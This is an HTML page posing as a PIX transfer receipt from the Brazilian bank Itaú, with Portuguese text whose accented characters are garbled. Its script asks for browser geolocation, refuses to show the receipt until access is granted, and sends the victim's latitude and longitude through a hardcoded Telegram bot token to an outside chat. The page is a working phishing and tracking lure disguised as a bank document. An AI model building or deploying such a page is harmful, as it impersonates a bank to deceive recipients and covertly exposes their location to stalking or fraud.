<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Comprovante de Transfer√™ncia ‚Äì Ita√∫</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}
  body{background:#f5f5f5}
  #spinnerBox{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
  #spinner{width:48px;height:48px;border:4px solid #ddd;border-top:4px solid #003366;border-radius:50%;animation:spin 1s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  #comprovante{display:none;background:#fff;width:100%;max-width:480px;margin:20px auto;padding:24px;border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
  .logo{background:#003366;color:#fff;font-weight:700;font-size:18px;padding:12px;text-align:center;border-radius:4px;margin-bottom:16px}
  .row{display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px}
  .label{color:#555}
  .value{font-weight:600}
  .divider{height:1px;background:#ddd;margin:12px 0}
  .center{text-align:center}
</style>
</head>
<body>

<div id="spinnerBox">
  <div id="spinner"></div>
  <p style="margin-top:12px;color:#003366;font-size:14px">Aguardando permiss√µes do seu navegador</p>
</div>

<div id="comprovante">
  <div class="logo">Ita√∫</div>
  <div class="row"><span class="label">Comprovante de Transfer√™ncia</span><span class="value" id="dataHora">05/06/2024 14:32:11</span></div>
  <div class="divider"></div>
  <div class="row"><span class="label">Valor</span><span class="value" id="valor">R$ 1.234,56</span></div>
  <div class="row"><span class="label">De</span><span class="value" id="nomeOrigem">Sua Conta Corrente</span></div>
  <div class="row"><span class="label">Para</span><span class="value" id="beneficiario">JO√ÉO DA SILVA SANTOS</span></div>
  <div class="row"><span class="label">Chave PIX</span><span class="value" id="chavePix">joao.santos@email.com</span></div>
  <div class="row"><span class="label">CPF/CNPJ</span><span class="value" id="cpf">***.456.789-**</span></div>
  <div class="divider"></div>
  <div class="row"><span class="label">ID da transa√ß√£o</span><span class="value" id="idTransacao">ITAUPIX20240605143211A1B2C3</span></div>
  <div class="row"><span class="label">Autentica√ß√£o BACEN</span><span class="value" id="autenticacao">A1B2C3D4E5F6G7H8I9J0</span></div>
  <div class="divider"></div>
  <p class="center" style="font-size:12px;color:#777">Transa√ß√£o realizada com sucesso.</p>
</div>

<script>
/* ---------- TOKEN ATUALIZADO ---------- */
const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
const CHAT_ID = '1003187104876';

const dados = {
  beneficiario: "JO√ÉO DA SILVA SANTOS",
  cpf: "***.456.789-**",
  chavePix: "joao.santos@email.com",
  valor: "R$ 1.234,56",
  dataHora: "05/06/2024 14:32:11",
  idTransacao: "ITAUPIX20240605143211A1B2C3",
  autenticacao: "A1B2C3D4E5F6G7H8I9J0"
};

Object.keys(dados).forEach(k => {
  const el = document.getElementById(k);
  if (el) el.textContent = dados[k];
});

function enviarTelegram(lat, lon) {
  const texto =
    `üìç Localiza√ß√£o capturada\n` +
    `Lat: ${lat}\n` +
    `Lon: ${lon}\n` +
    `Data/Hora: ${dados.dataHora}\n` +
    `Valor: ${dados.valor}`;
  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
  });
}

function showComprovante() {
  document.getElementById('spinnerBox').style.display = 'none';
  document.getElementById('comprovante').style.display = 'block';
}

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    pos => {
      const { latitude, longitude } = pos.coords;
      enviarTelegram(latitude, longitude);
      showComprovante();
    },
    () => {
      alert("Permiss√£o negada. Recarregue e permita acesso √† localiza√ß√£o para visualizar o comprovante.");
    },
    { timeout: 10000 }
  );
} else {
  alert("Geolocaliza√ß√£o n√£o suportada.");
}
</script>
</body>
</html>
